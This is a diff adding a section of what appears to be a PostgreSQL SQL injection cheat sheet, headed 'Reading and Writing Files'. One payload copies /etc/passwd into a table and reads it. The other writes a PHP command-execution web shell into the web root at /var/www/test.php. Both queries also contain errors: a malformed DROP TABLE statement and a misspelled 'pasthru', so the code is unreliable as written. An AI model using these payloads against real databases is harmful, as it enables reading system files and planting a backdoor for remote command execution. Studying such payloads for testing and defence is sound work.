@@ -1,0 +1,33 @@
+<h3 id="reading-and-writing-files">Reading and Writing Files</h3>
+
+
+<p class="pageDescription">{{site.data.injectionDescriptions.readingAndWritingFiles}}</p>
+
+<p>* Requires privileged user</p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Read Files from Operating System</td>
+      <td>
+		CREATE TABLE mydata(t text);<br>
+		COPY mydata FROM '/etc/passwd';<br>
+		SELECT * FROM mydata;<br>
+		DROP TABLE mytest mytest;<br>
+	  </td>
+    </tr>   
+    <tr>
+      <td>Writing Files from Operating System</td>
+      <td>
+		CREATE TABLE mytable (mycol text);<br>
+		INSERT INTO mytable(mycol) VALUES ('<? pasthru($_GET[cmd]); ?>');<br>
+		COPY mytable (mycol) TO '/var/www/test.php';<br>
+	  </td>
+    </tr>	
+  </tbody>
+</table>
